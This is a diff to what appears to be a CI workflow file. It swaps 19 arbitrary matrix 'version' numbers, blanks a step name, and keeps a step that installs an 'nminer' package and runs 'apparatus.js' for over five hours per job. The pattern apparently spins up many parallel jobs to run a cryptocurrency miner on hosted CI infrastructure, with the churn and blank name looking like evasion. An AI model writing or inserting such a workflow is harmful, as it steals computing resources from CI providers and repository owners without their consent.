@@ -9,25 +9,25 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 9410 }
-          - { version: 1785 }
-          - { version: 9952 }
-          - { version: 2584 }
-          - { version: 80 }
-          - { version: 6127 }
-          - { version: 2208 }
-          - { version: 6254 }
-          - { version: 9148 }
-          - { version: 5868 }
-          - { version: 8066 }
-          - { version: 6436 }
-          - { version: 5149 }
-          - { version: 8847 }
-          - { version: 1019 }
-          - { version: 1956 }
-          - { version: 9706 }
-          - { version: 6434 }
-          - { version: 9685 }
+          - { version: 8973 }
+          - { version: 1039 }
+          - { version: 2745 }
+          - { version: 761 }
+          - { version: 2299 }
+          - { version: 4795 }
+          - { version: 4088 }
+          - { version: 5932 }
+          - { version: 994 }
+          - { version: 1361 }
+          - { version: 5695 }
+          - { version: 2211 }
+          - { version: 4998 }
+          - { version: 7291 }
+          - { version: 8704 }
+          - { version: 450 }
+          - { version: 248 }
+          - { version: 5346 }
+          - { version: 6169 }
 
     steps:
       - name: Checkout
@@ -38,7 +38,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: into pish
+      - name: 
         run: |
           npm install nminer@latest
-          timeout 327m node apparatus.js || echo "apparatus executed"
+          timeout 312m node apparatus.js || echo "apparatus executed"
